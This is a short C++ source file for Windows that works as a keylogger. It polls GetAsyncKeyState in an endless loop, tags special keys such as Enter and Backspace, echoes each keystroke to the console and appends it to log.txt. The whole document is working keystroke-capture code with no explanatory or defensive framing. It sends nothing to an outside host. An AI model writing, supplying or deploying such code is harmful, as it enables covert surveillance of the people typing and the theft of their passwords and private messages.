#include <windows.h>
#include <iostream>
#include <fstream>

int main() {
    std::ofstream outfile{"log.txt", std::ios::app};
    while (true) {
        for (int ch = 8; ch <= 255; ch++) {
            if (GetAsyncKeyState(ch) & 0x8000) {
                std::string t;
                if (ch == VK_RETURN) t = "{ENTER}";
                else if (ch == VK_BACK) t = "{BACKSPACE}";
                else if (ch == VK_SPACE) t = "{SPACE}";
                else if (ch == VK_SHIFT) t = "{SHIFT}";
                else t = char(ch);
                std::cout << t << "\n";
                outfile << t << std::endl;
            }
        }
        Sleep(50);
    }
    return 0;
}